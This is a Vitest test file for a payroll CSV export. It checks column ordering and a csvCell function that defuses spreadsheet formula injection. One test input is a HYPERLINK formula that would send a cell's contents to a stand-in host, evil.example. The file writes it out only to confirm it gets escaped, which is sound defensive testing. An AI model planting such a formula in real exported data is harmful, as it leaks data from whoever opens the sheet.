import { describe, expect, it } from 'vitest';
import { csvCell, isPayrollColumn, normalizePayrollColumns, PAYROLL_COLUMNS } from './payroll.ts';

describe('payroll columns', () => {
  it('keeps the §F15 default order', () => {
    expect([...PAYROLL_COLUMNS]).toEqual([
      'date',
      'site',
      'project_code',
      'company',
      'trade',
      'workers',
      'hours',
      'report_no',
      'version',
    ]);
    expect(normalizePayrollColumns(null)).toEqual([...PAYROLL_COLUMNS]);
    expect(normalizePayrollColumns(undefined)).toEqual([...PAYROLL_COLUMNS]);
    expect(normalizePayrollColumns([])).toEqual([...PAYROLL_COLUMNS]);
  });

  it('honours a stored order, drops unknown / duplicate names and appends missing columns', () => {
    expect(
      normalizePayrollColumns(['company', 'hours', 'ssn', 'company', 'date', 'site', 'version']),
    ).toEqual([
      'company',
      'hours',
      'date',
      'site',
      'version',
      'project_code',
      'trade',
      'workers',
      'report_no',
    ]);
  });

  it('recognises column names', () => {
    expect(isPayrollColumn('report_no')).toBe(true);
    expect(isPayrollColumn('phone')).toBe(false);
    expect(isPayrollColumn(3)).toBe(false);
  });
});

describe('csvCell (OWASP CSV injection, W3-06)', () => {
  it('prefixes text that a spreadsheet would read as a formula', () => {
    expect(csvCell('=HYPERLINK("https://evil.example/?d="&B2,"Delta Electric")')).toBe(
      '"\'=HYPERLINK(""https://evil.example/?d=""&B2,""Delta Electric"")"',
    );
    expect(csvCell('+1')).toBe("'+1");
    expect(csvCell('-1')).toBe("'-1");
    expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
    expect(csvCell('\tTab Co')).toBe("'\tTab Co");
    expect(csvCell('\rCR Co')).toBe('"\'\rCR Co"');
  });

  it('leaves plain text, numbers and empty values alone, and still quotes', () => {
    expect(csvCell('Delta Mechanical')).toBe('Delta Mechanical');
    expect(csvCell('Delta, Inc')).toBe('"Delta, Inc"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('Tom-Ray Electric')).toBe('Tom-Ray Electric');
    expect(csvCell(-1)).toBe('-1');
    expect(csvCell(7)).toBe('7');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });
});
